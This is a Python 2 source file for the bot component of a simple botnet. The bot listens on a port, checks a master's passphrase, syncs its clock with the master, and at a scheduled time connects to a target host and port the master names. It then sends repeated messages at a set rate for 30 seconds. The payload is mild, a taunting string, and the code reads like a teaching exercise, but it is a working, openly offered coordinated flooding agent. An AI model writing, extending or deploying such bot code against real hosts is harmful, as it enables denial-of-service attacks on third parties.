#!/usr/bin/env python

import socket
import time
import Util
import signal
import sys
import argparse

"""
The Bot class represents a Bot to be used in the Botnet.
The Bot runs on the specified port, and listens for the Master.
Once the Master has connected and is authenticated, the necessary 
data is exchanged between the Bot and Master, i.e. target host, port number,
when to attack and the difference between the Bot and Master (if any) 
"""
class Bot:
   def __init__(self):
      print 'Initializing Bot...\n'

      signal.signal(signal.SIGINT, self.shutdown)

      # set up a server socket on which the bot will listen for the master
      # use socket.gethostname() instead of localhost so that the socket
      # is visible to the outside world
      self.botServerSocket = socket.socket()
      self.botServerSocket.setsockopt(\
         socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      global port
      self.botServerSocket.bind((socket.gethostname(), port))
      self.botServerSocket.listen(1)

      print 'Bot socket created'

      # listen for master and perform authentication
      self.master = None
      self.notAuthenticated = True
      while self.notAuthenticated:
         (self.notAuthenticated, self.master) = self.listenForMaster()

      # connected to the master, perform necessary communication
      cmd = Util.recieve(self.master)
      if cmd == Util.CODE_00: # send curr time
         # ''' ##### ADD 10 MS to skew the time ##### '''
         currTimeStr = str(Util.getCurrTime() + offset)
         Util.send(self.master, currTimeStr)

         info = Util.recieve(self.master)
         targetStr, sep, atkTime = info.partition('@')

         host, sep, port = targetStr.partition(':')
         target = (host, int(port))
         self.attack(target, atkTime)

         self.shutdown(None, None)

   """
   Listen for master and handle requests.
   """
   def listenForMaster(self):
      # blocks until client connects
      print 'Listening for Master on port', port, '...\n'
      connection, address = self.botServerSocket.accept()
      
      print 'Connected to Master: ' + str(address)

      # perform handshake with master to confirm it is the correct master
      print 'Authenticating Master...'

      recvdStr = Util.recieve(connection)

      # verify passphrase
      if recvdStr != Util.MASTER_PASSPHRASE:
         # not master
         connection.close()
         print 'Stranger tried to connect!'
         return (True, None)

      # was master, send bot passphrase
      print 'Master Authenticated\n'
      Util.send(connection, Util.BOT_PASSPHRASE)

      return (False, connection)

   """
   Perform the attack on the specified target's port at the given time.
   """
   def attack(self, target, atkTime):
      atkTimeStr = Util.formatTimeMS(atkTime)

      print 'Going to attack Target @ %s:%d on ' \
         % (target[0], target[1]) + atkTimeStr + '\n'

      # account for the time difference between bot and master
      waitTimeMilSecs = long(atkTime) -  (Util.getCurrTime() + offset)

      if waitTimeMilSecs < 0:
         print 'Missed the attack :-(' 
         return

      print 'Sleeping for [msec]: ', waitTimeMilSecs

      # wait
      waitTimeSecs = float(waitTimeMilSecs)/1000
      time.sleep(waitTimeSecs)

      # wait complete, connect to target
      print 'Connecting to Target @ %s:%d...' % (target[0], target[1])
      targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      targetSocket.connect((target[0], target[1]))
      print 'Connected'

      # perform attack for 30 seconds
      startTime = time.time()
      timeout = 30
      print 'Attacking for', timeout, 'seconds...'
      while time.time() < startTime + timeout:
         time.sleep(rate) # send message every second
         Util.send(targetSocket, 'You\'re being attacked!!!')
      print 'Attack finished'

      targetSocket.close()

   """
   Shut down gracefully.
   """
   def shutdown(self, signum, frame):
      if hasattr(self, 'master') and self.master != None:
         self.master.close()

      if hasattr(self, 'botServerSocket') and self.botServerSocket != None:
         self.botServerSocket.close()

      print '\nBot socket shut down'
      print 'Bot shut down'

      sys.exit(0)

if __name__ == '__main__':
   # handle arguments
   parser = argparse.ArgumentParser(description='Start Bot.')

   parser.add_argument('-p', '--port', dest='port', action='store', \
      type=int, required=False, help='The port on which to run the bot. \
      Default is 21800.', default=21800)

   parser.add_argument('-o', '--offset', dest='offset', action='store', \
      type=int, required=False, help='Offset from actual time. \
      Default is 0.', default=0)

   parser.add_argument('-r', '--rate', dest='rate', action='store', \
      type=float, required=False, help='Attack rate in ms. \
      Default is 1.', default=1)

   args = parser.parse_args()
   port = args.port
   offset = args.offset
   rate = args.rate/1000

   # invalid port
   if port <= 1024:
      parser.print_help()
      sys.exit(0)

   bot = Bot()
